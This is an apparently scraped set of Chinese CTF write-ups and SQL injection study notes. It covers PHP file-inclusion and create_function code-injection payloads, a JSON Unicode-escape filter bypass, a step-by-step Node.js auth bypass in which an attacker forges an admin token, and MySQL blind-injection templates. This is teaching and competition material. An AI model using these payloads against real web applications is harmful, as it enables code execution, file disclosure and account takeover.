121nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 解码后就是 1231nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 打印了所有变量 提示我们真的flag在realfl4g.php里面，那么就去包含realfl4g.php文件。 这个地方过滤了include和单引号，可以用require()来代替，过滤flag关键字，就用base64编码绕过。那么payload就是 1231nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;require(base64_%64%65%63%6f%64%65(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_functionPOST: debu&#x3D;1&amp;file&#x3D;1 解码后 12file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;&#125;require(base64_decode(cmVhbGZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F; 取反绕过+伪协议读取源码 payload 1231nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;create_function&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;POST: debu&#x3D;1&amp;file&#x3D;1 读到源码 12345678910111213&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;&lt;/head&gt;&lt;/html&gt;&lt;?php echo &quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;; $f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;; $rea1_f1114g = &quot;flag&#123;b1fcb796-18ed-4790-96d4-42becc504efc&#125;&quot;; unset($rea1_f1114g); 原来是把变量给释放了。 拓展 介绍一种非预期解： 数组绕过 加了个参数，传上去伪协议，然后get_defined_vars()数组获取到这个伪协议放到require()里包含，payload： 1?deb%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;rce&#x3D;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%72%65%61%31%66%6c%34%67%2e%70%68%70&amp;rce2&#x3D;r&amp;sha%6e%61[]&#x3D;a&amp;pa%73sw%64[]&#x3D;b&amp;fla%67[co%64e]&#x3D;create_function&amp;fla%67[ar%67]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);%0a&#x2F;&#x2F; 解码后： 123?debu&#x3D;aqua_is_cute&amp;file&#x3D;data:,debu_debu_aqua&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php&amp;rce2&#x3D;r&amp;shana[]&#x3D;a&amp;passwd[]&#x3D;b&amp;flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;;&#125;require(get_defined_vars()[_GET][rce]);&#x2F;&#x2F; 参考 https://www.gem-love.com/ctf/770.html [HarekazeCTF2019]encode_and_encode 考点 json字符转义 伪协议绕过 解题 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); 大概就是传一个json编码的数据，然后json解码，进行is_valid黑名单过滤，然后file_get_contents，再一次进行黑名单过滤，也就是既对原始数据，又对文件内容进行了过滤，由于json使支持unicode编码的，所以可以用unicode代替关键字，并用伪协议base64编码，payload: 1&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;\\u0066\\u006c\\u0061\\u0067&quot;&#125; 参考 https://p1htmlkernalweb.mybluemix.net/articles/[HarekazeCTF2019]encode_and_encode_3837296_csdn.html [CISCN2019 总决赛 Day1 Web4]Laravel1 TODO [CISCN2019 华北赛区 Day1 Web1]Dropbox TODO [HarekazeCTF2019]Easy Notes TODO [RCTF 2019]Nextphp TODO [De1CTF 2019]ShellShellShell TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"代码审计","slug":"CTF/代码审计","permalink":"http://ca0y1h.top/categories/CTF/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"2020电信天翼杯CTF初赛-APITest","date":"2020-07-31T13:58:37.000Z","path":"Web_security/ctf_writeup/17.2020电信天翼杯CTF—APITest/","text":"2020电信天翼杯CTF APITest 先吐槽一下，赛后竟然没有WP？？？？？ 完全不会nodejs，做了一下午居然做出来了。。。题目打开，访问sourceAPI接口，显示源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173const express = require(&quot;express&quot;);const cors = require(&quot;cors&quot;);const app = express();const uuidv4 = require(&quot;uuid/v4&quot;);const md5 = require(&quot;md5&quot;);const jwt = require(&quot;express-jwt&quot;);const jsonwebtoken = require(&quot;jsonwebtoken&quot;);const server = require(&quot;http&quot;).createServer(app);const &#123; flag, secret, jwtSecret &#125; = require(&quot;./flag&quot;);const config = &#123; port: process.env.PORT || 8081, adminValue: 1000, message: &quot;Can you get flag?&quot;, secret: secret, adminUsername: &quot;kirakira_dokidoki&quot;, whitelist: [&quot;/&quot;, &quot;/login&quot;, &quot;/init&quot;, &quot;/source&quot;],&#125;;let users = &#123; 0: &#123; username: config.adminUsername, isAdmin: true, rights: Object.keys(config) &#125;&#125;;app.use(express.json());app.use(cors());app.use( jwt(&#123; secret: jwtSecret &#125;).unless(&#123; path: config.whitelist &#125;));app.use(function(error, req, res, next) &#123; if (error.name === &quot;UnauthorizedError&quot;) &#123; res.json(err(&quot;Invalid token or not logged in.&quot;)); &#125;&#125;);function sign(o) &#123; return jsonwebtoken.sign(o, jwtSecret);&#125;function ok(data = &#123;&#125;) &#123; return &#123; status: &quot;ok&quot;, data: data &#125;;&#125;function err(msg = &quot;Something went wrong.&quot;) &#123; return &#123; status: &quot;error&quot;, message: msg &#125;;&#125;function isValidUser(u) &#123; return ( u.username.length &gt;= 6 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase() );&#125;function isAdmin(u) &#123; return (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;&#125;function checkRights(arr) &#123; let blacklist = [&quot;secret&quot;, &quot;port&quot;]; if(blacklist.includes(arr)) &#123; return false; &#125; for (let i = 0; i &lt; arr.length; i++) &#123; const element = arr[i]; if (blacklist.includes(element)) &#123; return false; &#125; &#125; return true;&#125;app.get(&quot;/&quot;, (req, res) =&gt; &#123; res.json(ok(&#123; hint: &quot;You can get source code from /source&quot;&#125;));&#125;);app.get(&quot;/source&quot;, (req, res) =&gt; &#123; res.sendFile( __dirname + &quot;/&quot; + &quot;app.js&quot;);&#125;);app.post(&quot;/login&quot;, (req, res) =&gt; &#123; let u = &#123; username: req.body.username, id: uuidv4(), value: Math.random() &lt; 0.0000001 ? 100000000 : 100, isAdmin: false, rights: [ &quot;message&quot;, &quot;adminUsername&quot; ] &#125;; if (isValidUser(u)) &#123; users[u.id] = u; res.send(ok(&#123; token: sign(&#123; id: u.id &#125;) &#125;)); &#125; else &#123; res.json(err(&quot;Invalid creds&quot;)); &#125;&#125;);app.post(&quot;/init&quot;, (req, res) =&gt; &#123; let &#123; secret &#125; = req.body; let target = md5(config.secret.toString()); let adminId = md5(secret) .split(&quot;&quot;) .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i)) .reduce((a, b) =&gt; a + b); res.json(ok(&#123; token: sign(&#123; id: adminId &#125;) &#125;));&#125;);// Get server infoapp.get(&quot;/serverInfo&quot;, (req, res) =&gt; &#123; let user = users[req.user.id] || &#123; rights: [] &#125;; let info = user.rights.map(i =&gt; (&#123; name: i, value: config[i] &#125;)); res.json(ok(&#123; info: info &#125;));&#125;);app.post(&quot;/becomeAdmin&quot;, (req, res) =&gt; &#123; let &#123;value&#125; = req.body; let uid = req.user.id; let user = users[uid]; let maxValue = [value, config.adminValue].sort()[1]; if(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123; user.isAdmin = true; res.send(ok(&#123; isAdmin: true &#125;)); &#125;else&#123; res.json(err(&quot;You need pay more!&quot;)); &#125;&#125;);// only admin can update userapp.post(&quot;/updateUser&quot;, (req, res) =&gt; &#123; let uid = req.user.id; let user = users[uid]; if (!user || !isAdmin(user)) &#123; res.json(err(&quot;You&#x27;re not an admin!&quot;)); return; &#125; let rights = req.body.rights || []; if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) &#123; users[uid].rights = user.rights.concat(rights).filter((value, index, self)=&gt;&#123; return self.indexOf(value) === index; &#125;); &#125; res.json(ok(&#123; user: users[uid] &#125;));&#125;);// only uid===0 can get the flagapp.get(&quot;/flag&quot;, (req, res) =&gt; &#123; if (req.user.id == 0) &#123; res.send(ok(&#123; flag: flag &#125;)); &#125; else &#123; res.send(err(&quot;Unauthorized&quot;)); &#125;&#125;);server.listen(config.port, () =&gt; console.log(`Server listening on port $&#123;config.port&#125;!`)); 基本思路 利用javascript大小写特性使用管理员的用户名登录 使用弱类型比较绕过isAdmin判断 给用户添加查看secret的权限并查看secret的值 通过赋值secret将adminId设置为0 获取Flag 第一步 loginAPI用javascript大小写特性绕过，payload 1&#123;&quot;username&quot;:&quot;Kırakira_dokidoki&quot;&#125; 回显token的值 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVkMWNlYmU1LTFiZWItNDA4Yi05YzE2LTViOGQ0NmM4ODIzMCIsImlhdCI6MTU5NjE4MTUyOH0.uyZInKJWeJ7mr290HKV5Z41Pf6_aCjPvvDEKkvanbtk&quot;&#125;&#125; 第二步 becomeAdminAPI使用字符串绕过 1&#123;&quot;value&quot;: &quot;11&quot;&#125; 回显： 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125; 第三步 使用数组绕过updateUserAPI 1&#123;&quot;rights&quot;:[[&quot;secret&quot;]]&#125; 回显 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;Kırakira_dokidoki&quot;,&quot;id&quot;:&quot;ed1cebe5-1beb-408b-9c16-5b8d46c88230&quot;,&quot;value&quot;:100,&quot;isAdmin&quot;:true,&quot;rights&quot;:[&quot;message&quot;,&quot;adminUsername&quot;,[&quot;secret&quot;]]&#125;&#125;&#125; 第四步 直接访问serverInfo获取secret的值，回显 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;info&quot;:[&#123;&quot;name&quot;:&quot;message&quot;,&quot;value&quot;:&quot;Can you get flag?&quot;&#125;,&#123;&quot;name&quot;:&quot;adminUsername&quot;,&quot;value&quot;:&quot;kirakira_dokidoki&quot;&#125;,&#123;&quot;name&quot;:[&quot;secret&quot;],&quot;value&quot;:&quot;1145141919810&quot;&#125;]&#125;&#125; 第五步 访问initAPI，payload 1&#123;&quot;secret&quot;:&quot;1145141919810&quot;&#125; 回显 1&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTk2MTg3MDk4fQ.Fdfrcfvnxjdh54WcTbu79nqKFv1dcucBCAoTJenw52I&quot;&#125;&#125; 第六步 把刚刚获得到的id=0的token替换之前的token得到flag。 参考：https://xz.aliyun.com/t/7177","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"}]},{"title":"SQL注入专项之MySQL基础操作","date":"2020-07-31T01:03:21.000Z","path":"Web_security/basic_learning/22.SQL注入专项之MySQL基础注入语法/","text":"SQL注入专项之MySQL基础注入语法 基本上摘自k0rz3n师傅的一篇文章，日常膜。 字符串操作 合并字符串 concat 1234567mysql&gt; select concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;);+----------------------------+| concat(&#39;hel&#39;,&#39;lo&#39;,&#39;world&#39;) |+----------------------------+| helloworld |+----------------------------+1 row in set (0.00 sec) concat_ws 1234567mysql&gt; select concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;);+----------------------------------+| concat_ws(&#39;+&#39;, &#39;hello&#39;, &#39;world&#39;) |+----------------------------------+| hello+world |+----------------------------------+1 row in set (0.00 sec) 截取字符串 substr或substring或mid 1234567mysql&gt; select substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5);+----------------------------------+| substring(&#39;www.baidu.com&#39;,&#39;5&#39;,5) |+----------------------------------+| baidu |+----------------------------------+1 row in set (0.00 sec) left 1234567mysql&gt; select left(&#39;flag&#123;this_is_test&#125;&#39;, 5);+-------------------------------+| left(&#39;flag&#123;this_is_test&#125;&#39;, 5) |+-------------------------------+| flag&#123; |+-------------------------------+1 row in set (0.00 sec) right 1234567mysql&gt; select right(&#39;flag&#123;this_is_test&#125;&#39;, 5);+--------------------------------+| right(&#39;flag&#123;this_is_test&#125;&#39;, 5) |+--------------------------------+| test&#125; |+--------------------------------+1 row in set (0.00 sec) substring_index 1234567891011121314151617181920212223mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1);+-----------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,1) |+-----------------------------------------------------+| flag&#123;111111 |+-----------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1);+------------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-1) |+------------------------------------------------------+| 333333&#125; |+------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2);+------------------------------------------------------+| substring_index(&#39;flag&#123;111111-222222-333333&#125;&#39;,&#39;-&#39;,-2) |+------------------------------------------------------+| 222222-333333&#125; |+------------------------------------------------------+1 row in set (0.00 sec) 计算字符串长度 char_length()/character_length() 和 length()/octet_length() 123456789101112131415mysql&gt; select char_length(&#39;你好&#39;);+-----------------------+| char_length(&#39;你好&#39;) |+-----------------------+| 2 |+-----------------------+1 row in set (0.00 sec)mysql&gt; select length(&#39;你好&#39;);+------------------+| length(&#39;你好&#39;) |+------------------+| 6 |+------------------+1 row in set (0.01 sec) char_length()/character_length() 计算的是字符的个数，而length()/octet_length() 计算的是字节的长度 改变存储的字符串 将 colname 列的双引号换成单引号 1replace(colname,&#39;&quot;&#39;,&#39;\\&#39;&#39;); 查找子字符串在字符串中的位置 locate locate(substr, str) 123456789101112131415mysql&gt; select locate(&#39;bar&#39;, &#39;foobar&#39;);+-------------------------+| locate(&#39;bar&#39;, &#39;foobar&#39;) |+-------------------------+| 4 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select locate(&#39;xbar&#39;, &#39;foobar&#39;);+--------------------------+| locate(&#39;xbar&#39;, &#39;foobar&#39;) |+--------------------------+| 0 |+--------------------------+1 row in set (0.00 sec) locate(substr, str, pos)/position 1234567mysql&gt; select locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5);+-------------------------------+| locate(&#39;bar&#39;, &#39;foobarbar&#39;, 5) |+-------------------------------+| 7 |+-------------------------------+1 row in set (0.00 sec) instr 123456789101112131415mysql&gt; select instr(&#39;123&#39;, &#39;12&#39;);+--------------------+| instr(&#39;123&#39;, &#39;12&#39;) |+--------------------+| 1 |+--------------------+1 row in set (0.00 sec)mysql&gt; select instr(&#39;123&#39;, &#39;4&#39;);+-------------------+| instr(&#39;123&#39;, &#39;4&#39;) |+-------------------+| 0 |+-------------------+1 row in set (0.00 sec) find_in_set 1234567mysql&gt; select find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;);+------------------------------+| find_in_set(&#39;a&#39;,&#39;a,b,c,d,e&#39;) |+------------------------------+| 1 |+------------------------------+1 row in set (0.00 sec) 正则匹配 like 常用通配符： 12345% : 匹配0个或任意多个字符_ : 匹配任意一个字符escape ： 转义字符，可匹配%和_ regexp/rlike 常用通配符 1234567891011. : 匹配任意单个字符* ： 匹配0个或多个前一个得到的字符[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。^ : 匹配开头，如^s匹配以s或者S开头的字符串。$ : 匹配结尾，如s$匹配以s结尾的字符串。&#123;n&#125; : 匹配前一个字符反复n次。 字符串区分大小写比较 1234567mysql&gt; select &#39;A&#39; &#x3D; binary &#39;a&#39;;+------------------+| &#39;A&#39; &#x3D; binary &#39;a&#39; |+------------------+| 0 |+------------------+1 row in set (0.01 sec) 自定义排序 elt 1elt(N ,str1 ,str2 ,str3 ,…) 若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。 若 N 小于 1 或大于参数的数目，则返回值为 NULL 。 1234567mysql&gt; SELECT ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;);+--------------------------------------+| ELT(3,&#39;hello&#39;,&#39;halo&#39;,&#39;test&#39;,&#39;world&#39;) |+--------------------------------------+| test |+--------------------------------------+1 row in set (0.00 sec) 在盲注中的应用 123456789101112131415mysql&gt; select elt(1,0);+----------+| elt(1,0) |+----------+| 0 |+----------+1 row in set (0.00 sec)mysql&gt; select elt(1,1);+----------+| elt(1,1) |+----------+| 1 |+----------+1 row in set (0.00 sec) field 1FIELD(str, str1, str2, str3, ……) 字段str按照字符串str1，str2，str3，str4的顺序返回查询到的结果集。如果表中str字段值不存在于str1，str2，str3，str4中的记录，放在结果集最前面返回。 当然这是正常的用法，还可以理解为这个函数返回的是str 在后面这些字符串中的索引。 123456789101112131415mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;);+--------------------------------------+| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;world&#39;) |+--------------------------------------+| 0 |+--------------------------------------+1 row in set (0.00 sec)mysql&gt; select field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;);+---------------------------------------------+| field(&#39;halo&#39;,&#39;hello&#39;,&#39;test&#39;,&#39;halo&#39;,&#39;world&#39;) |+---------------------------------------------+| 3 |+---------------------------------------------+1 row in set (0.00 sec) 在盲注中的应用 123456789101112131415mysql&gt; select field(1,0);+------------+| field(1,0) |+------------+| 0 |+------------+1 row in set (0.00 sec)mysql&gt; select field(1,1);+------------+| field(1,1) |+------------+| 1 |+------------+1 row in set (0.00 sec) 这里的第二个参数决定了这条语句的执行结果。 条件表达式 if语句 if(condition,result1,result2) 当 condition 结果为真时返回 result1 否则返回 result2,这常常用作我们盲注的开关函数 123456789101112131415mysql&gt; select if(1,1,0);+-----------+| if(1,1,0) |+-----------+| 1 |+-----------+1 row in set (0.00 sec)mysql&gt; select if(0,1,0);+-----------+| if(0,1,0) |+-----------+| 0 |+-----------+1 row in set (0.00 sec) case语句 基本形式： 1case(…)when…then…else…end 两种变体： 1case expr when val1 then result1 when val2 then result2 else result3 end; 先会判断 expr 的结果 ，再根据该结果是 val1 还是 val2 或者其他，来执行不同的语句。 1case when condition1 then result1 when condition2 result2 else result3 end; 直接根据不同情况进行选择。 比如可以构造这样一条注入语句： 1select * from test where id &#x3D;-1 union select 1,case when username like &#39;a%&#39; then 0 else 2222222222222222222 end,3,4 from tdb_admin 子查询 这一块我还没太看明白，先把模板贴下来 模板一 1select ... from ... where col &#x3D; [any|all](select...); 模板二 1select ....from ... where col [not]in(select...); 模板三 1select row(value1,valu2...) &#x3D; [any&#x2F;some](select col1,col2...); 模板四 1select ... from ...where col [not]exists(select...); 模板五 1select ... from (select ...) as name where ...","tags":[{"name":"Web安全学习","slug":"Web安全学习","permalink":"http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://ca0y1h.top/tags/SQL%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"Web安全/基础学习","permalink":"http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"MySQL盲注总结","date":"2020-07-30T01:48:40.000Z","path":"Web_security/basic_learning/23.SQL注入专项之MySQL盲注总结/","text":"MySQL盲注总结 最近在刷BUUCTF的时候，经常碰到MySQL盲注，但是每次碰到都有点不知道怎么下手，也看不出来是哪种类型的注入，在此就总结一下。主要是两种盲注方式： 基于布尔的SQL盲注 基于时间的SQL盲注 0x01 布尔盲注 使用条件","tags":[],"categories":[]},{"title":"CSICTF2020","date":"2020-07-26T14:56:51.000Z","path":"Web_security/ctf_writeup/20.CSICTF2020/","text":"CSICTF2020 Web+Linux Writeup 在ctfhub上面看到这个比赛，介绍里面说是面向萌新的，做了一下，题目确实比较友好，可以拿来练练手，而且到目前为止题目环境还没有关闭。很简单的题目就说一个考点略过去。。。。 https://ctf.csivit.com/challenges https://github.com/csivitu/ctf-challenges Web Warm Up 考察SHA1弱类型比较 1234567891011121314151617181920&lt;?phpif (isset($_GET[&#x27;hash&#x27;])) &#123; if ($_GET[&#x27;hash&#x27;] === &quot;10932435112&quot;) &#123; die(&#x27;Not so easy mate.&#x27;); &#125; $hash = sha1($_GET[&#x27;hash&#x27;]); $target = sha1(10932435112); if($hash == $target) &#123; include(&#x27;flag.php&#x27;); print $flag; &#125; else &#123; print &quot;csictf&#123;loser&#125;&quot;; &#125;&#125; else &#123; show_source(__FILE__);&#125;?&gt; Cascade F12直接Network查看CSS文件。 Oreo 考察Cookie Mr Rami 这个题是真的坑。。。。真会玩 直接查看robot.txt就行。。 Secure Portal 考察JS代码混淆 一堆被混淆后的JS代码 1var _0x575c=[&#x27;\\x32\\x2d\\x34&#x27;,&#x27;\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67&#x27;,&#x27;\\x34\\x2d\\x37&#x27;,&#x27;\\x67\\x65\\x74\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x64\\x65\\x6c\\x65\\x74\\x65\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x31\\x32\\x2d\\x31\\x34&#x27;,&#x27;\\x30\\x2d\\x32&#x27;,&#x27;\\x73\\x65\\x74\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x39\\x2d\\x31\\x32&#x27;,&#x27;\\x5e\\x37\\x4d&#x27;,&#x27;\\x75\\x70\\x64\\x61\\x74\\x65\\x49\\x74\\x65\\x6d&#x27;,&#x27;\\x62\\x62\\x3d&#x27;,&#x27;\\x37\\x2d\\x39&#x27;,&#x27;\\x31\\x34\\x2d\\x31\\x36&#x27;,&#x27;\\x6c\\x6f\\x63\\x61\\x6c\\x53\\x74\\x6f\\x72\\x61\\x67\\x65&#x27;,];(function(_0x4f0aae,_0x575cf8)&#123;var _0x51eea2=function(_0x180eeb)&#123;while(--_0x180eeb)&#123;_0x4f0aae[&#x27;push&#x27;](_0x4f0aae[&#x27;shift&#x27;]());&#125;&#125;;_0x51eea2(++_0x575cf8);&#125;(_0x575c,0x78));var _0x51ee=function(_0x4f0aae,_0x575cf8)&#123;_0x4f0aae=_0x4f0aae-0x0;var _0x51eea2=_0x575c[_0x4f0aae];return _0x51eea2;&#125;;function CheckPassword(_0x47df21)&#123;var _0x4bbdc3=[_0x51ee(&#x27;0xe&#x27;),_0x51ee(&#x27;0x3&#x27;),_0x51ee(&#x27;0x7&#x27;),_0x51ee(&#x27;0x4&#x27;),_0x51ee(&#x27;0xa&#x27;)];window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;9-12&#x27;,&#x27;BE*&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x2&#x27;),_0x51ee(&#x27;0xb&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x6&#x27;),&#x27;5W&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;16&#x27;,_0x51ee(&#x27;0x9&#x27;));window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x5&#x27;),&#x27;pg&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#x27;7-9&#x27;,&#x27;+n&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0xd&#x27;),&#x27;4t&#x27;);window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#x27;0x0&#x27;),&#x27;$F&#x27;);if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x8&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x9,0xc))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x2&#x27;))===_0x47df21[&#x27;substring&#x27;](0x4,0x7))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#x27;0x6&#x27;))===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x0,0x2))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](&#x27;16&#x27;)===_0x47df21[_0x51ee(&#x27;0x1&#x27;)](0x10))&#123;if(window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_